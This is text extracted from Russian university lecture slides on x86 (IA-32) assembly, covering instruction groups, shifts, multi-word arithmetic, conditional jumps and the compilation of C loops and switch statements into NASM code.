• Общего назначения           • Пересылка данных
• x87 FPU                     • Команды двоичной
• MMX                           арифметики
• SSE                         • Команды двоично-
• IA-32e                        десятичной арифметики
  команды                     • Логические команды
  64-разрядного режима        • Сдвиги и вращения
  работы                      • Битовые и байтовые
• Системные команды             команды
• Аппаратная                  • Передача управления
  виртуализация               • Строковые
• …                           • Ввод/Вывод
Цветом выделены группы        • Явное управление EFLAGS
команд, которые               • Вспомогательные
рассматриваются в курсе, на
                                                            2
лекциях и семинарах.
                                                                             © 2024 МГУ/ВМК/СП




                 Рост числа команд в архитектуре x86
                                                          Как подсчитывать команды?
                                                          • Разные коды операций
                                                          • Разные типы операндов
                                                          т.е. команды с одинаковым КОП,
                                                          но разными типами операндов
                                                          считаются различными




                                                       Суммарное число команд        3
Lopes B. et al. ISA aging: A x86 case study. – 2013.
                                                                                                                                          © 2024 МГУ/ВМК/СП
Год      Расширение          µ-архитектура                                       Описание
1978            Real              8086       Исходный набор команд реального режима
1982       Protected v1          80286       Первая версия защищенного режима
1985       Protected v2          80386       Защищенный режим                                                       Справочная информация
1985           SMM               80386       Режим управления системой (System Management Mode)                     Использовались материалы с сайта
1989            FPU              80486       Интеграция x87 FPU в основной кристалл
1996           MMX                 P5        Первая реализация SIMD-инструкций
                                                                                                                    https://en.wikichip.org/wiki/WikiChip
1998         3DNow!               K6-2       SIMD-инструкции для работы с FP одинарной точности
1999             SSE               P5        SIMD-инструкции для работы с FP одинарной точности
1999        E3DNow!                K7        Расширение 3DNow! (новые DSP-инструкции + несколько MMX-инструкций)
1999   Professional 3DNow!                   Маркетинговое название от AMD для E3DNow! + SSE
1999          EMMX                P6         Расширение MMX-инструкций
2001           SSE2               P6         Попытка заменить MMX-инструкции для более широких XMM регистров
2004           SSE3              Core        Третье расширение потоковых SIMD-инструкций
2005            VT-x           Pentium 4     Аппаратная виртуализация (Intel)
2006          AMD-V            Athlon 64     Аппаратная виртуализация (AMD)
2006           SSSE3             Core        Дополнение к расширению SSE3, инструкции для работы с запакованными целыми
2007          SSE4.1            Penryn       Расширение 4.1 для потоковых SIMD-инструкций
2007          SSE4a               K10        4 SIMD-инструкции, не относящиеся 4.1 или 4.2
2007           ABM                K10        Манипуляции отдельными битами
2008          SSE4.2           Nehalem       Расширение 4.2 для потоковых SIMD-инструкций
2007           SSE5                          Предложено AMD в 2007, но никогда не было реализовано
2008           SSE4                          Расширение 4 потоковых SIMD-инструкций, маркетинговое название для SSE4.1 + SSE4.2
2010          CLMUL            Westmere      Умножение без переноса для блочного шифрования
2011            AVX           Sandy Bridge   Операции над 256-разрядными целыми (Advanced Vector Extensions)
2012           F16C            Ivy Bridge    Приведение типов FP одинарной и половинной точности
2011            XOP             Bulldozer    Операции над векторами
2011          FMA4              Bulldozer    Умножение-сложение с однократным округлением над 4 операндами
2011            LWP             Bulldozer    Легковесное профилирование
2011            SMX             Nehalem      Контроль работы приложений
2011            AES            Westmere      Аппаратная реализация шифрования AES
2012           TBM              Piledriver   Манипуляции отдельными битами
2013           BMI1               Jaguar     Манипуляции отдельными битами
2013           BMI2              Haswell     Манипуляции отдельными битами
2013          FMA3               Haswell     Умножение-сложение с однократным округлением над 3 операндами
2013            TSX              Haswell     Транзакционная память
2013           AVX2              Haswell     Расширение AVX
2014            ADX            Broadwell     Сложение целых произвольной точности
2014         RdRand            Broadwell     Генерация случайных чисел
2014        PREFETCH           Broadwell     Упреждающая загрузка в кэш (ранее часть 3DNow!)
2015         AVX-512             Airmont     Операции над 512-разрядными регистрами
2015           MPX               Skylake     Защита памяти
2015            SGX              Skylake     Управление анклавами - области памяти, которые шифруются/расшифровываются на лету
2016            SHA            Goldmont      Вычисление криптографического хэша SHA
2017            SME                 Zen      Шифрование/расшифровывание страниц памяти на лету                                                       4
2019            TME              Ice Lake    Тотальное шифрование памяти
2021            CET            Tiger Lake    Контроль целостности потока управления
                                                                          © 2024 МГУ/ВМК/СП




        Как оценить тенденции в развитии ISA?
                                 𝑛−1
                                 1         𝑝𝑡−𝑖 — значение исходной функции в момент
Простое скользящее среднее 𝑆𝑀𝐴𝑡 = ෍ 𝑝𝑡−𝑖
                                 𝑛            времени t, отдалённый от текущего на i
                                 𝑖=0          интервалов.




                                                                                  5
                                                                            © 2024 МГУ/ВМК/СП




                  «Основные» команды IA-32
Пересылка    Двоичная    Передача            
                                      Логические
                                                     Сдвиги и   Битовые и
                                                                               Прочее
 данных     арифметика   управления                 вращения    байтовые
• MOV       • ADD        • JMP        • AND        • SAR        • SETcc     • LEA
• XCHG      • ADC        • Jcc        • OR         • SHR        • TEST      • NOP
• BSWAP     • SUB        • CALL       • XOR        • SAL,
• MOVSX     • SBB        • RET        • NOT          SHL
• MOVZX     • NEG                                  • ROR
• CDQ       • IMUL                                 • ROL
• CWD       • MUL
                                                   • RCR
• CBW       • IDIV
                                                   • RCL
• PUSH      • DIV
• POP       • INC        Красным выделены не упоминавшиеся ранее на
• CMOVcc    • DEC        лекциях ассемблерные инструкции.
            • CMP        Команды двоичной арифметики и логические команды
                         представлены в полном составе.
                                                                                    6
                                                                                     © 2024 МГУ/ВМК/СП



   Общий вид адресного кода при обращении к
                   памяти
  • LEA
       – r32, m




    Виды (способы) косвенной адресации                 Выражение                    Пример
Относительная                              База + Смещение                      [ebp-16]

Базово-индексная                           База + Индекс                        [eax+ecx]

Базово-индексная с масштабом               База + Масштаб * Индекс              [eax+4*ecx]

Базово-индексная с масштабом и смещением   База + Масштаб * Индекс + Смещение   [eax+4*ecx+10]
                                                                                              7
                                                        © 2024 МГУ/ВМК/СП



                     Пример
             Реализация стрелки Пирса
unsigned pierce_arrow(unsigned a, unsigned b) {
   int t = ~(a | b);
   return t;
}

                 section .text
                 global pierce_arrow
                 pierce_arrow:
                    push    ebp
                    mov     ebp, esp
                    mov     eax, dword [ebp+12] ; (1)
                    or      eax, dword [ebp+8] ; (2)
                    not     eax                 ; (3)
                    pop     ebp
                    ret
                                                                8
                                                                      © 2024 МГУ/ВМК/СП




                                Сдвиги
                                           Направление сдвига
                        Данные              Влево    Вправо
                            Беззнаковые      SHL       SHR      r/m 8/16/32, i8
Сдвиг влево                 Знаковые         SAL       SAR      r/m 8/16/32, cl
Начальное состояние
                                       Операнд



После сдвига на один разряд: SHL/SAL




После сдвига на 10 разрядов: SHL/SAL


                                                                              9
                                             © 2024 МГУ/ВМК/СП




                  Логический сдвиг вправо



Начальное состояние                Операнд



После сдвига на один разряд: SHR



После сдвига на 10 разрядов: SHR




                                                    10
                                               © 2024 МГУ/ВМК/СП




                 Арифметический сдвиг вправо

Начальное состояние (положительное число)



 После сдвига на один разряд: SAR




 Начальное состояние (отрицательное число)



 После сдвига на один разряд: SAR


                                                      11
                                                © 2024 МГУ/ВМК/СП




                           Пример

char upndown(char x) {
   return (x << 8) >> 8;
}

                 section .text
                 global upndown
                 upndown:
                    push    ebp
                    mov     ebp, esp
                    movsx   eax, byte [ebp+8]
                    sal     eax, 8
                    sar     eax, 8
                    pop     ebp
                    ret
                                                       12
                                         © 2024 МГУ/ВМК/СП


             Инструкция ROL

 Операнд приемник (память или регистр)




             Инструкция ROR

Операнд приемник (память или регистр)




             Инструкция RCL

 Операнд приемник (память или регистр)



             Инструкция RCR

 Операнд приемник (память или регистр)          13
                                                                                © 2024 МГУ/ВМК/СП

                                                     В 2013 году Intel были заявлены
     Пример: фрагмент кода                           команды, вычисляющие
 криптографической хеш-функции                       криптографические хэш-функции:
                                                     •SHA1RNDS4, SHA1NEXTE, SHA1MSG1, SHA1MSG2
unsigned sha256_f1(unsigned x) {            •SHA256RNDS2, SHA256MSG1, SHA256MSG2
   unsigned t;
   t = ((x >> 2) | (x << ((sizeof(x) << 3) - 2))); // (1)
   t ^= ((x >> 13) | (x << ((sizeof(x) << 3) - 13))); // (2)
   t ^= ((x >> 22) | (x << ((sizeof(x) << 3) - 22))); // (3)
   return t;
                           global sha256_f1
}
                           sha256_f1:
                              push    ebp
Криптографические             mov     ebp, esp
хеш-функции H(X):             mov     edx, dword [ebp+8] ; (1)
• Необратимость               pop     ebp                         ; (2)
  H(X) = m, m – задано        mov     eax, edx                    ; (3)
• Стойкость к коллизиям       mov     ecx, edx                    ; (4)
  первого рода                ror     eax, 13                     ; (5)
  H(M) = H(N), M – задано     ror     ecx, 2                      ; (6)
• Стойкость к коллизиям       xor     eax, ecx                    ; (7)
                              ror     edx, 22                     ; (8)
  второго рода
                              xor     eax, edx                    ; (9)
  H(M1) = H(M2)               ret                                             14
                                                                            © 2024 МГУ/ВМК/СП




                  «Основные» команды IA-32
Пересылка    Двоичная    Передача            
                                      Логические
                                                     Сдвиги и   Битовые и
                                                                               Прочее
 данных     арифметика   управления                 вращения    байтовые
• MOV       • ADD        • JMP        • AND        • SAR        • SETcc     • LEA
• XCHG      • ADC        • Jcc        • OR         • SHR        • TEST      • NOP
• BSWAP     • SUB        • CALL       • XOR        • SAL,
• MOVSX     • SBB        • RET        • NOT          SHL
• MOVZX     • NEG                                  • ROR
• CDQ       • IMUL                                 • ROL
• CWD       • MUL
                                                   • RCR
• CBW       • IDIV
                                                   • RCL
• PUSH      • DIV
• POP       • INC        Красным выделены не упоминавшиеся ранее на
• CMOVcc    • DEC        лекциях ассемблерные инструкции.
            • CMP        Команды двоичной арифметики и логические команды
                         представлены в полном составе.
                                                                                   16
                                           © 2024 МГУ/ВМК/СП



       Сложение 64 разрядных чисел на
           32 разрядных регистрах

long long f1(long long a, long long b) {
   long long c;
   c = a + b;
   return c;
}


; начало функции пропущено
   mov     eax, dword [ebp+16] ; (1)
   mov     edx, dword [ebp+20] ; (2)
   add     eax, dword [ebp+8] ; (3)
   adc     edx, dword [ebp+12] ; (4)
; конец функции пропущен

                                                  17
                                           © 2024 МГУ/ВМК/СП



      Вычитание 64 разрядных чисел на
          32 разрядных регистрах

long long f1(long long a, long long b) {
   long long c;
   c = a - b;
   return c;
}


; начало функции пропущено
   mov     eax, dword [ebp+8] ; (1)
   mov     edx, dword [ebp+12] ; (2)
   sub     eax, dword [ebp+16] ; (3)
   sbb     edx, dword [ebp+20] ; (4)
; конец функции пропущен

                                                  18
                                                        © 2024 МГУ/ВМК/СП



         Умножение 64 разрядных чисел на
             32 разрядных регистрах
long long f2(long long a,      globаl f2
              long long b) {   f2:
   long long c;                    push    ebp
   c = a * b;                      mov     ebp, esp
   return c;                       push    ebx
}                                  mov     eax, dword [ebp+8]
                                   mov     edx, dword [ebp+16]
                                   mov     ecx, dword [ebp+20]
                                   mov     ebx, dword [ebp+12]
                                   imul    ecx, eax
                                   imul    ebx, edx
                                   mul     edx
                                   add     ecx, ebx
                                   add     edx, ecx
                                   pop     ebx
                                   pop     ebp
                                   ret                         19
                                                                         © 2024 МГУ/ВМК/СП



       Обоснование умножения на «коротких»
                 регистрах (1/3)

               𝑤−1                                     𝑤−2

      U(𝑥Ԧ𝑤 ) = ෍ 2𝑖 𝑥𝑖          𝑇 𝑥Ԧ𝑤 = −2𝑤−1 𝑥𝑤−1 + ෍ 2𝑖 𝑥𝑖
               𝑖=0                                     𝑖=0
  Беззнаковая интерпретация           Знаковая интерпретация
    w-разрядного битового         w-разрядного битового вектора 𝑥Ԧ𝑤
         вектора 𝑥Ԧ𝑤

                          2𝑤−2

𝑇 𝑥Ԧ2𝑤 = −22𝑤−1 𝑥2𝑤−1 + ෍ 2𝑖 𝑥𝑖 =
                          𝑖=0

                                       2𝑤−2           𝑤−1

                 = 2𝑤 −2𝑤−1 𝑥2𝑤−1 + ෍ 2𝑖 𝑥𝑖+𝑤 + ෍ 2𝑖 𝑥𝑖 =
                                        𝑖=𝑤           𝑖=0


  ℎ  старшие w разрядов битового вектора 𝑥
𝑥Ԧ𝑤                                       Ԧ2𝑤        = 2𝑤 𝑇 𝑥Ԧ𝑤
                                                              ℎ +U 𝑥
                                                                   Ԧ𝑤𝑙
                                                                                20
  𝑙  младшие w разрядов
𝑥Ԧ𝑤
                                                                © 2024 МГУ/ВМК/СП



    Обоснование умножения на «коротких»
              регистрах (2/3)
Обозначим
   U(𝑥Ԧ𝑤 ) = 𝑥ƴ   𝑇 𝑥Ԧ𝑤 = 𝑥


Лемма

    𝑥ƴ ∗ 𝑦ƴ 𝑚𝑜𝑑2𝑤 = 𝑥ƴ ∗ 𝑦 𝑚𝑜𝑑2𝑤 = 𝑥 ∗ 𝑦ƴ 𝑚𝑜𝑑2𝑤 = 𝑥 ∗ 𝑦 𝑚𝑜𝑑2𝑤



   𝑥ƴ = 𝑥 + 2𝑤 𝑥𝑤−1




                                                                       21
                                                                                       © 2024 МГУ/ВМК/СП



           Обоснование умножения на «коротких»
                     регистрах (3/3)
                                                   ∗2𝑤  умножение битовых векторов размера 2w с
                                                 сохранением результата в виде вектора размера 2w

     𝑦Ԧ𝑤ℎ : 𝑦Ԧ𝑤𝑙 ∗2𝑤 𝑥Ԧ𝑤
                       ℎ     𝑙
                         : 𝑥Ԧ𝑤 =

= 22𝑤 ∗ 𝑇 𝑦Ԧ𝑤ℎ ∗ 𝑇 𝑥Ԧ𝑤
                     ℎ
                       + 2𝑤 ∗ 𝑇 𝑦Ԧ𝑤ℎ ∗ 𝑈 𝑥Ԧ𝑤
                                           𝑙
                                             + 𝑈 𝑦Ԧ𝑤𝑙 ∗ 𝑇 𝑥Ԧ𝑤
                                                            ℎ
                                                                        + 𝑈 𝑦Ԧ𝑤𝑙 ∗ 𝑈 𝑥Ԧ𝑤
                                                                                       𝑙
                                                                                         𝑚𝑜𝑑22𝑤




 разряды
          4w                3w          2w            w           0
                                                                        h*h
                                                                        h*l
                                                                        l*h
                                                                         l*l

                           h – старшая половина разрядов множителя, l – младшая.              22
                                          © 2024 МГУ/ВМК/СП




                     Далее…

• Арифметика
• Операции над машинными словами
• Реализация управляющих операторов языка Си
  – goto-форма
  – Условная передача данных
  – Организация циклов
  – Оператор switch




                                                 23
             © 2024 МГУ/ВМК/СП




Лекция 7


28 февраля
                                                      © 2024 МГУ/ВМК/СП



      Jcc        Условие              Описание
JE          ZF             Равно / Ноль
JNE         ~ZF            Не равно / Не ноль
JS          SF             Отрицательное число
JNS         ~SF            Неотрицательное число
JG          ~(SF^OF)&~ZF   Больше (знаковые числа)
JGE         ~(SF^OF)       Больше либо равно
                           (знаковые числа)
JL          (SF^OF)        Меньше (знаковые числа)
JLE         (SF^OF)|ZF     Меньше либо равно
                           (знаковые числа)
JA          ~CF&~ZF        Больше (числа без знака)
JB          CF             Меньше (числа без знака)
                                                              2
                                          © 2024 МГУ/ВМК/СП




Сравнение знаковых чисел
       Сравнение x и y реализуется как формула над
       флагами, полученными после вычисления (x-y)




                                                  3
                                                                            © 2024 МГУ/ВМК/СП




                  «Основные» команды IA-32
Пересылка    Двоичная    Передача            
                                      Логические
                                                     Сдвиги и   Битовые и
                                                                               Прочее
 данных     арифметика   управления                 вращения    байтовые
• MOV       • ADD        • JMP        • AND        • SAR        • SETcc     • LEA
• XCHG      • ADC        • Jcc        • OR         • SHR        • TEST      • NOP
• BSWAP     • SUB        • CALL       • XOR        • SAL,
• MOVSX     • SBB        • RET        • NOT          SHL
• MOVZX     • NEG                                  • ROR
• CDQ       • IMUL                                 • ROL
• CWD       • MUL
                                                   • RCR
• CBW       • IDIV
                                                   • RCL
• PUSH      • DIV
• POP       • INC        Красным выделены не упоминавшиеся ранее
• CMOVcc    • DEC        на лекциях ассемблерные инструкции.
            • CMP        Команды двоичной арифметики и логические
                         команды представлены в полном составе.
                                                                                    4
                                                             © 2024 МГУ/ВМК/СП




                    Логический тип данных

  • Начиная с C99 определен тип _Bool
     – Принимаемые значения 0 или 1
     – Для хранения выделяется 1 байт
  • setcc r/m 8     if (condition code) {
                              ОП ← 1
                           } else {
                              ОП ← 0
                           }

Задача на восстановление типов и операции сравнения

cmp_f:                         _Bool cmp_f(_____ x, _____ y) {
   mov eax, [esp+8]               return x _____ y;
   cmp [esp+4], eax            }
   setl al
   ret                                                               5
                                                     © 2024 МГУ/ВМК/СП




int absdiff(int x, int y) {
                                   GOTO-форма
    int result;                   программы (1/3)
    if (x > y) {
      result = x-y;   absdiff:
    } else {             push ebp
      result = y-x;      mov ebp, esp
    }                    mov edx, dword [8 + ebp] ; (1)
    return result;       mov eax, dword [12 + ebp] ; (2)
}                        cmp edx, eax              ; (3)
                         jle .L6                   ; (4)
                         sub edx, eax              ; (5)
                         mov eax, edx              ; (6)
                         jmp .L7                   ; (7)
                      .L6:                         ; (8)
                         sub eax, edx              ; (9)
                      .L7:                         ; (10)
                         pop ebp
                         ret
                                                             6
                                                    © 2024 МГУ/ВМК/СП



jmp label       ~   goto label;        GOTO-форма
                                     программы (2/3)
cmp …           ~   if (cc)
jcc label              goto label;


if (expr) {             _Bool t = !(expr);       cmp …
   then_stmt;           if (t)                   jcc .else
} else {                   goto else_label;      then_stmt
   else_stmt;           then_stmt;               jmp .end
}                       goto end_label;       .else:
                        else_label:              else_stmt
                        else_stmt;            .end
                        end_label:




                                                            7
                                                     © 2024 МГУ/ВМК/СП

int goto_ad(int x, int y) {
  int result;                       GOTO-форма
  if (x <= y) goto Else;
  result = x-y;
                                  программы     (3/3)
  goto Exit;          absdiff:
Else:                    push ebp
  result = y-x;          mov ebp, esp
Exit:                    mov edx, dword [8 + ebp] ; (1)
  return result;         mov eax, dword [12 + ebp] ; (2)
}                        cmp edx, eax              ; (3)
                         jle .L6                   ; (4)
                         sub edx, eax              ; (5)
                         mov eax, edx              ; (6)
                         jmp .L7                   ; (7)
                      .L6:                         ; (8)
                         sub eax, edx              ; (9)
                      .L7:                         ; (10)
                         pop ebp
                         ret
                                                             8
                                                   © 2024 МГУ/ВМК/СП




            Условная передача данных


   val = Test ? Then_Expr : Else_Expr;

   val = x>y ? x-y : y-x;




   nt = !(Test);                tmp_val = Then_Expr;
   if (nt) goto Else;           val = Else_Expr;
   val = Then_Expr;             t = Test;
   goto Done;                   if (t) val = tmp_val;
Else:
   val = Else_Expr;
Done:
   ...                                                     9
                                                © 2024 МГУ/ВМК/СП

 Конвейер – совмещение разных действий в
          один момент времени

• Общая для различный предметных областей методика
• Длительность обработки неизменна или несколько
  увеличивается
• Увеличение пропускной способности




                                                       10
                                                                © 2024 МГУ/ВМК/СП



        Опустошение конвейера при передаче
                   управления
                                                1 (Fet) Извлечение
                                                        инструкции из
                                                        памяти
                                                2 (Dec) Декодирование
                                                        команды
                                                3 (D-F) Загрузка операндов
                                                4 (Exe) Выполнение
                                                        операции над
                                                        данными
                                                5 (Wrt) Запись результата




Современные процессоры борются с опустошением
                                                                       11
конвейера предсказанием переходов
                                                       © 2024 МГУ/ВМК/СП




int absdiff(int x, int y) {     int absdiff(int x, int y) {
    int result;                     return (x > y)? x-y: y-x;
    if (x > y) {                }
      result = x-y;                 Более короткая запись …
    } else {
      result = y-x;              Регистр   Значение
    }
                                   edi        x
    return result;
}                                  esi        y

absdiff:
   ...
   mov   edx, edi
   sub   edx, esi   ; tmp_val:edx = x-y
   mov   eax, esi
   sub   eax, edi   ; result:eax = y-x
   cmp   edi, esi   ; Compare x:y
   cmovg eax, edx   ; If >, result:eax = tmp_val:edx
   ...                                                        12
                                          © 2024 МГУ/ВМК/СП




  Условная передача данных: Pro et Contra

• Выигрыш в производительности на «несложных»
  операторах if-else
• Ограничения применения
  – Защитные условия
  – Побочные эффекты
  – «Тяжелые» вычисления




                                                 13
                                                    © 2024 МГУ/ВМК/СП




                 Оператор do-while
int pcount_do(unsigned x) {
  int result = 0;
  do {
    result += x & 0x1;
    x >>= 1;
  } while (x);
  return result;              int pcount_do(unsigned x) {
}                               int result = 0;
                              loop:
                                result += x & 0x1;
                                x >>= 1;
                                if (x)
                                  goto loop;
                                return result;
                              }
                                                           14
                                                            © 2024 МГУ/ВМК/СП




                        Оператор do-while
                                     int pcount_do(unsigned x) {
   Регистр   Значение                  int result = 0;
    edx         x                    loop:
                                       result += x & 0x1;
    ecx      result
                                       x >>= 1;
                                       if (x)
                                         goto loop;
                                       return result;
                                     }
   mov ecx, 0       ;   result = 0
.L2:                ; loop:
   mov eax, edx
   and eax, 1       ;    t = x & 1
   add ecx, eax     ;    result += t
   shr edx, 1       ;    x >>= 1
   jne .L2          ;    If !0, goto loop                          15
                                                       © 2024 МГУ/ВМК/СП




                       Оператор while
int pcount_while(unsigned x) {
  int result = 0;
  while (x) {
    result += x & 0x1;           int pcount_do(unsigned x) {
    x >>= 1;                       int result = 0;
  }                                if (!x) goto done;
  return result;                 loop:
}                                  result += x & 0x1;
                                   x >>= 1;
                                   if (x)
int pcount_do(unsigned x) {          goto loop;
  int result = 0;                done:
loop:                              return result;
  if (!x) goto done;             }
  result += x & 0x1;
  x >>= 1;
  goto loop;
done:
  return result;
}                                                             16
                                                          © 2024 МГУ/ВМК/СП




                         Оператор for
#define WSIZE 8*sizeof(int)       int pcount_for_gt(unsigned x) {
                                    int i;
int pcount_for(unsigned x) {        int result = 0;
  int i;                            i = 0;
  int result = 0;                   if (!(i < WSIZE))
  for (i = 0; i < WSIZE; i++) {       goto done;
    unsigned mask = 1 << i;        loop:
    result += (x & mask) != 0;      {
  }                                   unsigned mask = 1 << i;
  return result;                      result += (x & mask) != 0;
}                                   }
                                    i++;
                                    if (i < WSIZE)
                                      goto loop;
                                   done:
                                    return result;
                                  }
                                                                 17
                                                             © 2024 МГУ/ВМК/СП


int fib(int x) { // x >= 1    fib:
  int i;                         push   ebp
  int p_pred = 0;                mov    ebp, esp
  int pred = 1;                  push   ebx
  int res = 1;
  x--;                          mov     ecx, dword [ebp + 8] ; x
  for (i = 0; i < x; i++) {     xor     edx, edx             ; p_pred
     res = p_pred + pred;       mov     ebx, 1               ; pred
     p_pred = pred;             mov     eax, 1               ; res
     pred = res;                dec     ecx
  }
  return res;                    jecxz .end
}                             .loop:
                                 lea   eax, [edx + ebx]
                                 mov   edx, ebx
    Регистр   Значение
                                 mov   ebx, eax
      ecx        x               loop .loop
      edx      p_pred
                              .end:
      ebx       pred             pop ebx
      eax        res             pop ebp
                                 ret                                18
                                                             © 2024 МГУ/ВМК/СП


int fib(int x) { // x >= 1    fib:
  int i;                         push   ebp
  int p_pred = 0;                mov    ebp, esp
  int pred = 1;                  push   ebx
  int res = 1;
  x--;                          mov     ecx, dword [ebp + 8] ; x
  for (i = 0; i < x; i++) {     xor     edx, edx             ; p_pred
     res = p_pred + pred;       mov     ebx, 1               ; pred
     p_pred = pred;             mov     eax, 1               ; res
     pred = res;                dec     ecx
  }
  return res;                    jecxz .end
}                             .loop:
                                 lea   eax, [edx + ebx]
                                 mov   edx, ebx
    Регистр   Значение
                                 mov   ebx, eax
      ecx        x               loop .loop
      edx      p_pred
                              .end:
      ebx       pred             pop ebx
      eax        res             pop ebp
                                 ret                                19
                                                             © 2024 МГУ/ВМК/СП


int fib(int x) { // x >= 1    fib:
  int i;                         push   ebp
  int p_pred = 0;                mov    ebp, esp
  int pred = 1;                  push   ebx
  int res = 1;
  x--;                          mov     ecx, dword [ebp + 8] ; x
  for (i = 0; i < x; i++) {     xor     edx, edx             ; p_pred
     res = p_pred + pred;       mov     ebx, 1               ; pred
     p_pred = pred;             mov     eax, 1               ; res
     pred = res;                dec     ecx
  }
  return res;                    jecxz .end
}                             .loop:
                                 lea   eax, [edx + ebx]
                                 mov   edx, ebx
    Регистр   Значение
                                 mov   ebx, eax
      ecx        x               loop .loop
      edx      p_pred
                              .end:
      ebx       pred             pop ebx
      eax        res             pop ebp
                                 ret                                20
                                                             © 2024 МГУ/ВМК/СП


int fib(int x) { // x >= 1    fib:
  int i;                         push   ebp
  int p_pred = 0;                mov    ebp, esp
  int pred = 1;                  push   ebx
  int res = 1;
  x--;                          mov     ecx, dword [ebp + 8] ; x
  for (i = 0; i < x; i++) {     xor     edx, edx             ; p_pred
     res = p_pred + pred;       mov     ebx, 1               ; pred
     p_pred = pred;             mov     eax, 1               ; res
     pred = res;                dec     ecx
  }
  return res;                    jecxz .end
}                             .loop:
                                 lea   eax, [edx + ebx]
                                 mov   edx, ebx
    Регистр   Значение
                                 mov   ebx, eax
      ecx        x               loop .loop
      edx      p_pred
                              .end:
      ebx       pred             pop ebx
      eax        res             pop ebp
                                 ret                                21
                                                  © 2024 МГУ/ВМК/СП




                   Обратная задача
f:
   ...
   mov edx, dword [ebp+8] ; (1)   int f(unsigned x) {
   mov eax, 0             ; (2)      int val = 0;
   test edx, edx          ; (3)      while (________) {
   je .L7                 ; (4)         ____________;
 .L10:                    ;             ____________;
   xor eax, edx           ; (5)      }
   shr edx, 1             ; (6)      return ________;
   jne .L10               ; (7)   }
 .L7:                     ;
   and eax, 1             ; (8)
   ...



                                                         22
                                          © 2024 МГУ/ВМК/СП




                     Далее…

• Арифметика
• Операции над машинными словами
• Реализация управляющих операторов языка Си
  – goto-форма
  – Условная передача данных
  – Организация циклов
  – Оператор switch




                                                 23
           © 2024 МГУ/ВМК/СП




Лекция 8


 2 марта
                                                           © 2024 МГУ/ВМК/СП

enum TargetPosition {
   TARGET_AT_BEGINNING,
   TARGET_AT_MIDDLE,
   TARGET_AT_END
};

switch (targetPosition){

case TARGET_AT_BEGINNING:
   offsetInWindow = 0;
   break;
case TARGET_AT_MIDDLE:
   offsetInWindow = MIN (newSize - size, newSize / 2);
   break;
case TARGET_AT_END:
   offsetInWindow = newSize - size;
   break;
default:
   _error_code = IllegalData;
   _error_msg = tr("requested target position"
                    " is not a TargetPosition enum member");
}
                                                                   2
© 2024 МГУ/ВМК/СП




        3
                                                           © 2024 МГУ/ВМК/СП




enum TargetPosition {
   TARGET_AT_BEGINNING,
   TARGET_AT_MIDDLE,
   TARGET_AT_END
};

if (TARGET_AT_BEGINNING == targetPosition) {
   offsetInWindow = 0;
} else if (TARGET_AT_MIDDLE == targetPosition) {
   offsetInWindow = MIN (newSize - size, newSize / 2);
} else if (TARGET_AT_END == targetPosition) {
   offsetInWindow = newSize - size;
} else {
   _error_code = IllegalData;
   _error_msg = tr("requested target position"
                    " is not a TargetPosition "
                                            " enum member");
}


                                                                   4
                                                   © 2024 МГУ/ВМК/СП

; в edx помещено значение управляющего выражения
; т.е. targetPosition

 cmp edx, TARGET_AT_BEGINNING
 jne .comp2
; код для case TARGET_AT_BEGINNING:
 jmp .switch_exit

.comp2:
 cmp edx, TARGET_AT_MIDDLE
 jne .comp3
; код для case TARGET_AT_MIDDLE:
 jmp .switch_exit

.comp3:
 cmp edx, TARGET_AT_END
 jne .default
; код для case TARGET_AT_END:
 jmp .switch_exit

.default:
; код для default:
.switch_exit:                                              5
                                                       © 2024 МГУ/ВМК/СП




Вспоминаем пример из курса «АиАЯ»:
подсчет количества дней, прошедших с первого января.
                                                               6
© 2024 МГУ/ВМК/СП




        7
                                                            © 2024 МГУ/ВМК/СП




                          Duff’s Device
void duffs_device(char *to, char *from, int count) {

    register n = (count + 7) / 8; /* count > 0 assumed */

    switch (count % 8) {
       case 0:     do { *to++ = *from++;
       case 7:            *to++ = *from++;
       case 6:            *to++ = *from++;
       case 5:            *to++ = *from++;
       case 4:            *to++ = *from++;
       case 3:            *to++ = *from++;
       case 2:            *to++ = *from++;
       case 1:            *to++ = *from++;
                       } while (--n > 0);
    }
}      «Упрощенная» версия
       Бьёрн Страуструп «Язык программирования C++»
                                                                    8
                                                            © 2024 МГУ/ВМК/СП



                       Duff’s Device
                   Оригинальная версия
void duffs_device(char *to, char *from, int count) {

    register n = (count + 7) / 8; /* count > 0 assumed */

    switch (count % 8) {
       case 0:      do { *to = *from++;
       case 7:             *to = *from++;
       case 6:             *to = *from++;
       case 5:             *to = *from++;
       case 4:             *to = *from++;
       case 3:             *to = *from++;
       case 2:             *to = *from++;
       case 1:             *to = *from++;
                       } while (--n > 0);
    }
}      Указатель to ссылается на область памяти, в
       которую отображен регистр ввода/вывода.
       Современные версии языка Си будут требовать                  9
       объявления volatile char *to
                                                  © 2024 МГУ/ВМК/СП


long switch_eg
   (long x, long y, long z)
                                • Допустимо использовать
{                                 несколько меток для
    long w = 1;                   одного блока
    switch (x) {
    case 1:                       – cases 5 и 6
        w = y*z;
        break;
    case 2:                     • В отсутствии break
        w = y/z;                  управление
        /* «проваливаемся» */     «проваливается» в
    case 3:
        w += z;                   следующий блок кода
        break;                    – case 2
    case 5:
    case 6:
        w -= z;                 • Некоторые значения
        break;
    default:                      могут быть пропущены
        w = 2;                    – case 4
    }
    return w;
                                                         10
}
                                                                © 2024 МГУ/ВМК/СП




Исходный оператор
switch                                              Размещение кода
                         Таблица переходов
switch (x) {             JTab:   адрес_0
                                               адрес_0:   Блок
  case val_0:                                               0
    Блок 0                       адрес_1
  case val_1:                    адрес_2       адрес_1:   Блок
    Блок 1                          •
    • • •                                                  1
  case val_n-1:                      •
    Блок n–1                         •         адрес_2:
                                 адрес_n-1                Блок
}
                                                           2

                                                            •
Упрощенное отображение
                                                            •
target = JTab[x];                                           •
goto *target;
                                             адрес_n-1:   Блок
                                                          n–1          11
                                                      © 2024 МГУ/ВМК/СП


long switch_eg(long x, long y, long z) {
    long w = 1;
    switch (x) {
      . . .
    }
    return w;
}

switch_eg:                         Инициализацию переменной w
  push   ebp                     ; отложили на потом …
  mov    ebp, esp                ;

  mov    edx, dword [ebp + 8]    ; edx = x
  mov    eax, dword [ebp + 12]   ; eax = y
  mov    ecx, dword [ebp + 16]   ; ecx = z

  dec    edx
  cmp    edx, 5                  ; сравниваем (x-1) и 5
  ja     .L8                     ; если >u goto default
  jmp    [.L4 + 4*edx]           ; goto *JTab[x]             12
                                                             © 2024 МГУ/ВМК/СП


long switch_eg(long x, long y, long z) {
    long w = 1;
    switch (x) {                                    Таблица переходов
      . . .
                                            section .rodata align=4
    }                                       .L4:
    return w;                                  dd .L3 ; x = 1
                    1. Вычисление индекса в
